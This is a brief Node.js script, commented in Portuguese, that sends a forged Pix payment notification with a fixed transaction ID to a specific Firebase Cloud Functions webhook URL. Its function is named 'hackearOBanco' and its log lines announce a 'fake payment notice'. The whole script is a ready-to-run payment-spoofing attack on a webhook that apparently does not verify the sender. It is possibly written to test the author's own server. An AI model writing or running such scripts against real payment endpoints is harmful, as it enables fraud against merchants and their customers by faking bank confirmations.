const axios = require("axios");

// A porta do seu servidor
const WEBHOOK_URL = "https://us-central1-base-delivery-1d420.cloudfunctions.net/webhookPix";

// O SEU TXID EXATO
const TXID_DO_PIX = "65bad6e2bf5241ed8a8ab67a9ffcb6fd"; 

async function hackearOBanco() {
    console.log("🚀 Disparando o aviso de pagamento falso para o servidor...");
    try {
        await axios.post(WEBHOOK_URL, {
            pix: [{ txid: TXID_DO_PIX }] // Mandando a fofoca no formato do banco
        });
        console.log("✅ BOOM! Aviso enviado com sucesso!");
        console.log("🔄 O servidor Firebase acabou de receber a notificação do banco.");
    } catch (e) {
        console.log("❌ Erro:", e.message);
    }
}

hackearOBanco();